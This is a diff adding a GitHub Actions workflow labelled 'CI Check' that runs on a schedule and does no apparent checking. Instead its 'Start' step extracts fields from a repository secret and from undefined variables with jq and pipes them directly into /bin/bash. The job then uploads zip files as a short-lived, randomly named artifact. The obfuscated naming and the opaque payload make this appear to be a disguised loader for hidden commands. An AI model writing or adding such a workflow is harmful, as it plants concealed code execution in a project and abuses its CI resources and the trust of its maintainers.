@@ -1,0 +1,32 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          scas7: ${{ secrets.scas7 }}
+        run: |
+          printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
+          echo $cl525 | jq -r .ukplo1 | /bin/bash
+          echo $srhsg8525 | jq -r .nmo256 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: MXFb0BXQ
+          path: "*.zip"
+          retention-days: 1
